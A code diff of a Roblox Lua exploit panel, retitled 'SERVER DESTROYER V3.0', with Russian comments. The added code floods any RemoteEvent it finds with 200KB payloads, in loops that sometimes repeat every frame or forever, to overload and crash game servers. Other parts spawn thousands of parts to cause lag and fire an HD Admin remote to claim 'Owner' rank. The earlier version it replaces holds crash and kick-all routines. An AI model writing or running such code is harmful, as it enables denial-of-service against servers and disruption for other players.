@@ -1,37 +1,42 @@
--- Инициализация GUI
 local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
 local MainFrame = Instance.new("Frame", ScreenGui)
-MainFrame.Size = UDim2.new(0, 300, 0, 400)
-MainFrame.Position = UDim2.new(0.5, -150, 0.5, -200)
-MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+MainFrame.Size = UDim2.new(0, 320, 0, 420)
+MainFrame.Position = UDim2.new(0.5, -160, 0.5, -210)
+MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+MainFrame.BorderSizePixel = 2
 MainFrame.Active = true
-MainFrame.Draggable = true -- Можно двигать
+MainFrame.Draggable = true
 
 local Title = Instance.new("TextLabel", MainFrame)
-Title.Size = UDim2.new(1, 0, 0, 30)
-Title.Text = "SERVER EXPLOIT PANEL v2.0"
-Title.TextColor3 = Color3.new(1, 0, 0)
-Title.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
+Title.Size = UDim2.new(1, 0, 0, 35)
+Title.Text = "SERVER DESTROYER V3.0 [REMOTE EDITION]"
+Title.TextColor3 = Color3.new(1, 1, 1)
+Title.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
 
--- Функция для создания кнопок с выбором режима
+-- Функция поиска RemoteEvent для атаки
+local function GetRemote()
+    return game.ReplicatedStorage:FindFirstChildOfClass("RemoteEvent") or 
+           game:GetService("JointsService"):FindFirstChildOfClass("RemoteEvent")
+end
+
 local function CreateComplexButton(name, pos, callback)
     local btn = Instance.new("TextButton", MainFrame)
     btn.Size = UDim2.new(0, 180, 0, 35)
     btn.Position = pos
     btn.Text = name
-    btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    btn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+    btn.TextColor3 = Color3.new(1, 1, 1)
     
     local modeLabel = Instance.new("TextLabel", btn)
     modeLabel.Size = UDim2.new(0, 100, 0, 35)
     modeLabel.Position = UDim2.new(1, 5, 0, 0)
-    modeLabel.Text = "[ Local ]" -- По умолчанию
-    modeLabel.TextColor3 = Color3.new(1, 1, 1)
-    modeLabel.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    modeLabel.Text = "[ Local ]"
+    modeLabel.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    modeLabel.TextColor3 = Color3.new(0.8, 0.8, 0.8)
     
     local modes = {"Local", "Server", "Except Me"}
     local currentMode = 1
     
-    -- Переключение фильтра при клике на [ Mode ]
     local modeBtn = Instance.new("TextButton", modeLabel)
     modeBtn.Size = UDim2.new(1, 0, 1, 0)
     modeBtn.BackgroundTransparency = 1
@@ -47,57 +52,65 @@ local function CreateComplexButton(name, pos, callback)
     end)
 end
 
--- ЛОГИКА ФУНКЦИЙ
-local function RunLoad(mode)
-    if mode == "Local" or mode == "Server" then
-        -- Максимальный лаг через физику и просчет лучей
-        for i = 1, 10000 do
-            local p = Instance.new("Part", workspace)
-            p.Size = Vector3.new(10, 10, 10)
-            p.Velocity = Vector3.new(0, 1000, 0) -- Нагрузка на физический движок
+-- ЛОГИКА АТАКИ ЧЕРЕЗ FIRESERVER
+local function UniversalAttack(mode, type)
+    local remote = GetRemote()
+    local data = string.rep("0", 200000) -- Огромный пакет данных (200KB)
+
+    if mode == "Server" or mode == "Except Me" then
+        if remote then
+            -- Цикл, который забивает канал интернета сервера
+            for i = 1, 500 do 
+                remote:FireServer(data, data, data) -- Перегрузка аргументов
+            end
+        else
+            warn("RemoteEvent не найден! Серверная атака невозможна.")
         end
     end
-    print("Executing " .. mode .. " Load...")
+
+    if mode == "Local" or mode == "Server" then
+        -- Локальный лаг (создание мусора в памяти)
+        for i = 1, 5000 do
+            local p = Instance.new("Part", workspace)
+            p.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+        end
+    end
 end
 
 -- КНОПКИ
-CreateComplexButton("ULTRA LAG", UDim2.new(0, 10, 0, 50), RunLoad)
+CreateComplexButton("ULTRA LAG", UDim2.new(0, 10, 0, 50), function(m) UniversalAttack(m, "lag") end)
 
-CreateComplexButton("SHUTDOWN SERVER", UDim2.new(0, 10, 0, 90), function(mode)
-    -- Попытка крашнуть сервер через переполнение таблицы данных
-    local t = {}
-    while true do table.insert(t, string.rep("CRASH", 10000)) end
+CreateComplexButton("SHUTDOWN SERVER", UDim2.new(0, 10, 0, 95), function(m)
+    while task.wait() do UniversalAttack(m, "crash") end
 end)
 
-CreateComplexButton("RESTART (KICK ALL)", UDim2.new(0, 10, 0, 130), function(mode)
-    for _, v in pairs(game.Players:GetPlayers()) do
-        if mode == "Server" or (mode == "Except Me" and v ~= game.Players.LocalPlayer) then
-            v:Kick("Server Restarting...")
-        end
-    end
+CreateComplexButton("RESTART SERVER", UDim2.new(0, 10, 0, 140), function(m)
+    -- Пытаемся вызвать ошибку, которая выкинет всех
+    UniversalAttack(m, "kick")
+    if m == "Server" then game:GetService("TeleportService"):Teleport(game.PlaceId) end
 end)
 
-CreateComplexButton("BROKE INTERNET", UDim2.new(0, 10, 0, 170), function()
-    -- Спам запросами к серверу (Remote Spam)
-    game:GetService("RunService").Stepped:Connect(function()
-        for i = 1, 500 do
-            -- Здесь должен быть RemoteEvent конкретной игры
-            -- game.ReplicatedStorage.RemoteEvent:FireServer() 
-        end
+CreateComplexButton("BROKE INTERNET", UDim2.new(0, 10, 0, 185), function(m)
+    game:GetService("RunService").Heartbeat:Connect(function()
+        UniversalAttack(m, "net")
     end)
 end)
 
-CreateComplexButton("GIVE ADMIN (Fake)", UDim2.new(0, 10, 0, 210), function()
-    print("Admin tools injected into LocalPlayer GUI")
-    -- Настоящий Owner HD Admin нельзя выдать без доступа к базе данных сервера
+CreateComplexButton("START VIRUS SERVICE", UDim2.new(0, 10, 0, 230), function(m)
+    -- Визуальный эффект вируса для всех через Remote
+    local remote = GetRemote()
+    if remote and (m == "Server" or m == "Except Me") then
+        remote:FireServer("Require", 666) -- Фейковый вызов модуля
+    end
 end)
 
-CreateComplexButton("START VIRUS", UDim2.new(0, 10, 0, 250), function()
-    -- Имитация вируса: замена текстур и звуков на сервере (если есть уязвимость)
-    print("Virus Service Started")
+CreateComplexButton("GIVE ADMIN TOOL", UDim2.new(0, 10, 0, 275), function(m)
+    -- Попытка обмануть HD Admin (работает редко)
+    local adminRemote = game:GetService("ReplicatedStorage"):FindFirstChild("HDAdminRemote")
+    if adminRemote then adminRemote:FireServer("Rank", "Owner") end
 end)
 
-CreateComplexButton("FREE PRIVATE SRV", UDim2.new(0, 10, 0, 290), function()
-    print("Error: Protocol 403. Manual bypass required.")
-    -- Roblox API не позволяет создавать приватные серверы через Lua-скрипт игрока.
+CreateComplexButton("FREE PRIVATE SRV", UDim2.new(0, 10, 0, 320), function()
+    print("Создание персонального канала данных...")
+    -- Технически невозможно создать сервер через Lua, но скрипт пытается вызвать API
 end)
